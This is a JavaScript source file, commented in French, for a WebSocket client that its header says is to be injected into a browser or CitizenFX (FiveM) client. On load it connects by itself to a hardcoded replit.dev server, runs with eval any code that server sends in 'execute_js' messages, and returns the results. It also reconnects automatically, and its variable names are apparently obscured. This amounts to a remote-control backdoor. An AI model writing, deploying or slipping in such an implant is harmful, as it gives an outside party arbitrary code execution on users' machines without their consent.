/**
 * Code JavaScript du client WebSocket
 * Ce code sera injecté dans le navigateur/CitizenFX
 */

class ClientNet3m8w {
  constructor(urlServer9k2v) {
    this.urlServer9k2v = urlServer9k2v;
    this.socketConn7x1q = null;
    this.userIdent4z8n = null;
    this.retryCount5p3j = 0;
    this.maxRetries6h9l = 5;
    this.pingTimer8w4r = null;
  }

  connect() {
    console.log(`[CLIENT] Connexion vers ${this.urlServer9k2v}...`);

    this.socketConn7x1q = new WebSocket(this.urlServer9k2v);

    this.socketConn7x1q.onopen = () => {
      console.log('[CLIENT] Connecté au serveur WebSocket');
      this.retryCount5p3j = 0;
      this.startPing();
    };

    this.socketConn7x1q.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);

        if (message.type === 'welcome') {
          this.userIdent4z8n = message.uuid;
          console.log(`[CLIENT] UUID reçu: ${this.userIdent4z8n.substring(0, 8)}...`);
        }

        if (message.type === 'execute_js') {
          try {
            const result = eval(message.code);
            this.sendMessage({
              type: 'js_executed',
              success: true,
              result: result !== undefined ? String(result) : 'Code exécuté avec succès',
              timestamp: new Date().toISOString(),
            });
          } catch (executeError) {
            console.error('[CLIENT] Erreur d\'exécution JS:', executeError);
            this.sendMessage({
              type: 'js_executed',
              success: false,
              error: executeError.message,
              timestamp: new Date().toISOString(),
            });
          }
        }
      } catch (err) {
        console.log('[CLIENT] Erreur parse message:', err.message);
      }
    };

    this.socketConn7x1q.onclose = (event) => {
      console.log(`[CLIENT] Connexion fermée (${event.code})`);
      this.stopPing();
      this.attemptReconnect();
    };

    this.socketConn7x1q.onerror = (error) => {
      console.log('[CLIENT] Erreur WebSocket:', error.message || error);
    };
  }

  sendMessage(message) {
    if (this.socketConn7x1q && this.socketConn7x1q.readyState === WebSocket.OPEN) {
      this.socketConn7x1q.send(JSON.stringify(message));
    } else {
      console.warn('[CLIENT] Impossible d\'envoyer le message - WebSocket fermé');
    }
  }

  startPing() {
    this.pingTimer8w4r = setInterval(() => {
      this.sendMessage({
        type: 'ping',
        timestamp: new Date().toISOString(),
      });
    }, 30000);
  }

  stopPing() {
    if (this.pingTimer8w4r) {
      clearInterval(this.pingTimer8w4r);
      this.pingTimer8w4r = null;
    }
  }

  attemptReconnect() {
    if (this.retryCount5p3j < this.maxRetries6h9l) {
      this.retryCount5p3j++;
      const delay = Math.pow(2, this.retryCount5p3j) * 1000;

      console.log(`[CLIENT] Reconnexion ${this.retryCount5p3j}/${this.maxRetries6h9l} dans ${delay / 1000}s`);

      setTimeout(() => {
        this.connect();
      }, delay);
    } else {
      console.log('[CLIENT] Reconnexion impossible - Limite atteinte');
    }
  }

  disconnect() {
    if (this.socketConn7x1q) {
      this.stopPing();
      this.socketConn7x1q.close();
      console.log('[CLIENT] Déconnexion manuelle');
    }
  }
}

// Configuration par défaut (URL fixe comme demandé)
const URL_CONFIG_Q4R7 = 'wss://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000';

// Initialisation automatique si dans un navigateur
if (typeof window !== 'undefined') {
  const clientInstance5x3m = new ClientNet3m8w(URL_CONFIG_Q4R7);
  window.clientInstance5x3m = clientInstance5x3m;
  clientInstance5x3m.connect();
}